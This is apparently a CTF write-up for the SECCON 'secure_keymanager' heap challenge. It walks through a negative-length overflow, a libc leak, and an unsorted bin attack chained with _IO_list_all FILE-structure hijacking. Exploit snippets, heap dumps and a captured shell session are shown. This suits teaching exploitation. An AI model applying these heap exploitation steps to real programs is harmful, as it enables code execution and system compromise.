```
Points:   400
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

### Summary

We're presented with a menu driven heap pwnable. In particular we have the following options:

```
Set Your Account Name >> 
Set Your Master Pass >> 

1. add
2. show
3. edit
4. remove
9. change master pass
0. exit
>> 
```

The account name & pass are bss arrays of size `0x10`. Not much of importance at the moment. `show` is completely useless.

#### ~ Add 

When we create a key, we're asked to enter the length of the key along with a title and the key itself. The important thing
to note is that we can enter a **negative** number as length, the given length is added to **0x20** before malloc gets called
and finally the key is read via `getnline` with the size argument being the given length (without the addition, meaning if we
enter a negative length it will read in nothing), while the title is using **0x20** as a hardcoded size (crucial for exploitation
later).

The malloc'd chunks have the following structure:

```c
struct key {
    char title[0x20];
    char key[length];
}
```

Once a key has been added, two actions take place. Firstly, key's address is placed in a pointer array of size `0x7` at address 
`0x6020e0`. Secondly, there is a bytearray which works as a switch in order to signify when a chunk is free or not. On a fresh
allocation, the corresponding pointer array index becomes **1** in the bytearray and during deletion it becomes **0**.

![img1](https://github.com/xerof4ks/heapwn/blob/master/SECCON/img/add_key.png)

![img2](https://github.com/xerof4ks/heapwn/blob/master/SECCON/img/add_key2.png)

#### ~ Edit

By choosing `edit` we can edit the `key` member of the struct. `edit` uses `malloc_usable_size` which internally calls `musable`,
on the current chunk in order to extract its size, then subtracts **0x20** from it and finally calls `getnline` which will read 
in the new key.

![img3](https://github.com/xerof4ks/heapwn/blob/master/SECCON/img/edit_key.png)

#### ~ Remove

`Remove` free's **only** the malloc pointer, it doesn't zero out the entry in the chunk array. However, it does zero out the byte
value in the bytearray. There is definitely a way to create a double-free scenario via this indirect UAF but I didn't pursue this
path towards exploiting the binary. 

![img4](https://github.com/xerof4ks/heapwn/blob/master/SECCON/img/remove_key.png)

### Exploit Analysis

Now that we've established how the binary works, let's get to pwning. First things first, info leak.

#### ~ Libc Leak

In case we want to change the master pass, we have to enter the previous account name in order to be prompted with a new input. 
However, because of the fact that `read` doesn't null terminate strings, we can get a leak out of it. Specifically, if we enter
the wrong account name, the binary will just print whatever we entered.

![leak](https://github.com/xerof4ks/heapwn/blob/master/SECCON/img/leak.png)

```python
acc    = "kek"
key    = "lel"
reg(acc, key)

# Leak libc
libc   = leak('A'*0x18) - 0x3c5620
```

```
gdb-peda$ x/4gx $rax
0x7fffffffe3a0:	0x4141414141414141	0x4141414141414141
0x7fffffffe3b0:	0x4141414141414141	0x00007ffff7dd2620
gdb-peda$ x 0x00007ffff7dd2620
0x7ffff7dd2620 <_IO_2_1_stdout_>:	0x00000000fbad2887

[+] Libc:         0x7ffff7a0d000
[+] _IO_list_all: 0x7ffff7dd2520
[+] system:       0x7ffff7a52390
```

#### ~ Overflow

By carefully requesting a chunk of a certain size we can achieve 2 overflows with the former one causing the latter. 
What do I mean by that? What's going to happen if we provide `-0x10` as the key length? Well, `malloc` will be called with size
**0x10** (which will be aligned to 0x20) and then it will read in **0x20** bytes for the title and **0x00** for the key.
Let me show how that transition looks like.

Before: 

```
0x603000:	0x0000000000000000	0x0000000000000021 <-- alloc'd chunk
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000020fe1 <-- top chunk
```

After:

```
0x603000:	0x0000000000000000	0x0000000000000021 <-- alloc'd chunk
0x603010:	0x4141414141414141	0x4141414141414141
0x603020:	0x4141414141414141	0x0041414141414141 <-- top chunk
```

As you can see, the wilderness got overwritten! With that overflow in mind, we can achieve chunk overlapping during `edit` and
overwrite important values on chunks further in memory such as the FD/BK pointers of an unsorted/fast bin and whatnot. From now on,
it's a matter of personal preference. I chose to pwn the binary by performing `unsorted bin attack` followed by an `_IO_list_all attack`. 
You can read more about the latter [here](http://4ngelboy.blogspot.gr/2016/10/hitcon-ctf-qual-2016-house-of-orange.html) and
[here](http://uaf.io/exploitation/2017/09/03/TokyoWesterns-2017-Parrot.html). They've both done a pretty decent job explaining
the internals of the attack so I won't go over the hows and whys.

Let's start visualizing the binary's internals.

```python
# This is gonna be our victim chunk later on
alloc(0xa0, 'A'*8, 'A'*8) 
alloc(0x60, 'B'*8, 'B'*8) 
# p64(0x31) is there to signify later on to musable() 
# that the current chunk is actually in use
alloc(0x80, 'C'*8, p64(0x31)*8)
```

```
0x603000:	0x0000000000000000	0x00000000000000d1 <-- chunk 0
0x603010:	0x4141414141414141	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x4141414141414141	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000091 <-- chunk 1
0x6030e0:	0x4242424242424242	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x4242424242424242	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000000
0x603120:	0x0000000000000000	0x0000000000000000
0x603130:	0x0000000000000000	0x0000000000000000
0x603140:	0x0000000000000000	0x0000000000000000
0x603150:	0x0000000000000000	0x0000000000000000
0x603160:	0x0000000000000000	0x00000000000000b1 <-- chunk 2
0x603170:	0x4343434343434343	0x0000000000000000
0x603180:	0x0000000000000000	0x0000000000000000
0x603190:	0x0000000000000031	0x0000000000000031
0x6031a0:	0x0000000000000031	0x0000000000000031 <-- fake chunk
0x6031b0:	0x0000000000000031	0x0000000000000031
0x6031c0:	0x0000000000000031	0x0000000000000031
0x6031d0:	0x0000000000000000	0x0000000000000000
0x6031e0:	0x0000000000000000	0x0000000000000000
0x6031f0:	0x0000000000000000	0x0000000000000000
0x603200:	0x0000000000000000	0x0000000000000000
0x603210:	0x0000000000000000	0x0000000000020df1 <-- top chunk

gdb-peda$ x/7bx 0x602120
0x602120 <key_map>:	0x01	0x01	0x01	0x00	0x00	0x00	0x00
gdb-peda$ x/4gx 0x6020e0
0x6020e0 <key_list>:	0x0000000000603010	0x00000000006030e0
0x6020f0 <key_list+16>:	0x0000000000603170	0x0000000000000000
```

Feel free to ignore the `p64(0x31)` spam and the fake chunk for now. Next, we'll free `chunk 0` and make 2 more allocations.

```python
free(acc, key, 0)
```

```
0x603000:	0x0000000000000000	0x00000000000000d1 <-- chunk 0 [free]
0x603010:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x4141414141414141	0x0000000000000000
```

```python
alloc(-0x10,  'D'*8, 'D'*8) # chunk x 
alloc(0x60, 'E'*8, 'E'*8)   # chunk y
```

```
0x603000:	0x0000000000000000	0x0000000000000021 <-- chunk x
0x603010:	0x4444444444444444	0x00007ffff7dd1c00
0x603020:	0x0000000000000000	0x0000000000000091 <-- chunk y
0x603030:	0x4545454545454545	0x00007ffff7dd1c00
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x4545454545454545	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000021 <-- unsorted chunk
0x6030c0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x6030d0:	0x0000000000000020	0x0000000000000090 <-- chunk 1
```

Now, we'll free `chunk x` and request it back but this time we will cause an overflow to `chunk y`.

```python
# Free fast chunk
free(acc, key, 0)
```

```
(0x20)     fastbin[0]: 0x603000 --> 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x603210 (size : 0x20df0) 
       last_remainder: 0x6030b0 (size : 0x20) 
            unsortbin: 0x6030b0 (size : 0x20)
```

```python
# Get back the same fast chunk & 
# overwrite next chunk's size field
alloc(-10,  'F'*0x18 + p32(0x181), 'D'*8)  # 0
```

```
0x603000:	0x0000000000000000	0x0000000000000021 <-- chunk x back at it
0x603010:	0x4646464646464646	0x4646464646464646
0x603020:	0x4646464646464646	0x0000000000000181 <-- chunk y size overflow
0x603030:	0x4545454545454545	0x00007ffff7dd1c00
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x4545454545454545	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000021 <-- unsorted chunk
0x6030c0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x6030d0:	0x0000000000000020	0x0000000000000090 <-- chunk 1
```

We have successfully ovewritten `chunk y`'s size with the value **0x181**. This size is big enough to overwrite the unsorted chunk
at address `0x6030b0` and furthermore overwrite its BK pointer in order to perform the unsorted bin attack.
  
#### ~ Unsorted bin & _IO_list_all attack 

If we were to call edit on `chunk y`, `musable` wouldn't let us enter any bytes because of the `inuse(p)` check which would
let `musable` know that the chunk is actually free'd.

```c
static size_t
musable(void* mem)
{
  mchunkptr p;
  if (mem != 0) {
    p = mem2chunk(mem);
    if (chunk_is_mmapped(p))
      return chunksize(p) - 2*SIZE_SZ;
    else if (inuse(p))
      return chunksize(p) - SIZE_SZ;
  }
  return 0;
}
```

```c
/* extract p's inuse bit */
#define inuse(p)							      \
  ((((mchunkptr) (((char *) (p)) + chunksize (p)))->mchunk_size) & PREV_INUSE)
```

We can bypass that check by crafting a fake chunk at offset `chunk y + size(chunk y)`, meaning `0x6031a0`, with size whose last
bit will be set (i.e `0x31` for instance). Which is what we did before but told you to ignore it for the time being.

```
0x6031a0:	0x0000000000000031	0x0000000000000031 <-- fake chunk
0x6031b0:	0x0000000000000031	0x0000000000000031
0x6031c0:	0x0000000000000031	0x0000000000000031
0x6031d0:	0x0000000000000000	0x0000000000000000
0x6031e0:	0x0000000000000000	0x0000000000000000
0x6031f0:	0x0000000000000000	0x0000000000000000
0x603200:	0x0000000000000000	0x0000000000000000
0x603210:	0x0000000000000000	0x0000000000020df1 <-- top chunk
```

Time to perform the attacks.

```python
fstream  = "/bin/sh\x00"
fstream += p64(0x61)
fstream += p64(0) 
# bk => _IO_list_all
fstream += p64(iolist-0x10)
fstream += p64(2)
fstream += p64(3)
fstream  = fstream.ljust(0x60,"\x00")
fstream += p64(0) * 3
fstream += p64(system)
fstream  = fstream.ljust(0xd8,"\x00")
fstream += p64(vtable)
# musable() will use the chunk's size to read in data.
# Because we have overwritten it with a big enough size
# the data will overlap the unsorted bin which happens 
# be right after the currently edited chunk.
# Unsorted bin attack => _IO_list_all attack
edit(acc, p64(system), 3, p64(0)*12 + fstream)
```

```
0x6030b0:	0x0068732f6e69622f	0x0000000000000061 <-- unsorted chunk 
0x6030c0:	0x000000000000ddaa	0x00007ffff7dd2510 <-- _IO_list_all - 0x10
0x6030d0:	0x0000000000000002	0x0000000000000003
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000000
0x603120:	0x0000000000000000	0x00007ffff7a52390 <-- system
0x603130:	0x0000000000000000	0x0000000000000000
0x603140:	0x0000000000000000	0x0000000000000000
0x603150:	0x0000000000000000	0x0000000000000000
0x603160:	0x0000000000000000	0x0000000000000000
0x603170:	0x0000000000000000	0x0000000000000000
0x603180:	0x0000000000000000	0x0000000000602118 <-- vtable ptr
```

All we have to do now is allocate a new chunk such that we bypass the following check:

```c
if (in_smallbin_range (nb) &&        
    bck == unsorted_chunks (av) &&   
    victim == av->last_remainder &&  
    (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) 
    {
```  

In order to fall under this case:

```c
/* remove from unsorted list */
unsorted_chunks (av)->bk = bck;   
bck->fd = unsorted_chunks (av);
```

So that `_IO_list_all` gets overwritten with the unsorted bin's address. Then, `malloc` will stumble upon a check:

```c
bck = unsorted_chunks(av);
fwd = bck->fd;
if (__glibc_unlikely (fwd->bk != bck)) 
{
    errstr = "free(): corrupted unsorted chunks";
    goto errout;
}
```

From which it will call `malloc_printerr => __libc_message => abort => fflush / _IO_flush_all_lockp`. By taking care of the
check requirements before aborting, we can trigger `_IO_OVERFLOW` which we have impersonated with `system`. Finally, we will
get our beloved shell.

```
[+] Opening connection to secure_keymanager.pwn.seccon.jp on port 47225: Done
[+] Libc:         0x7f7c9b1d4000
[+] _IO_list_all: 0x7f7c9b599520
[+] system:       0x7f7c9b219390
[*] Switching to interactive mode
$ id
uid=10035 gid=10000(sec_km) groups=10000(sec_km)
$ ls
flag.txt
secure_keymanager
$ cat flag.txt
SECCON{C4n_y0u_b347_h34p_45lr?}
```
